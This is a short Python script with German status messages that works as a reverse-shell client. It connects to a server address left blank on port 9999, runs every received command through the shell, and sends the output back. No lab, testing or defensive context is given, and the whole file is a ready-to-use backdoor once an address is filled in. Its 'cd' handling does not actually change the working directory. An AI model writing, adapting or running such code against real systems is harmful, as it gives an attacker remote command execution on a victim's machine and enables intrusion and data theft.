import socket
import subprocess
import os

server_ip = ''
server_port = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((server_ip, server_port))
    print('Connected to Server :)')
    
    while True:
        cmd = sock.recv(1024)
        command = cmd.decode()
        
        if command.startswith("cd "):
            os.system(command) 
            continue
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        output = result.stdout
        error = result.stderr
        
        if error:
            sock.sendall(error.encode())
        else:
            sock.sendall(output.encode())

except ConnectionRefusedError:
    print('Verbindung zum Server abgelehnt.')

finally:

    sock.close()
    print('Verbindung geschlossen.')
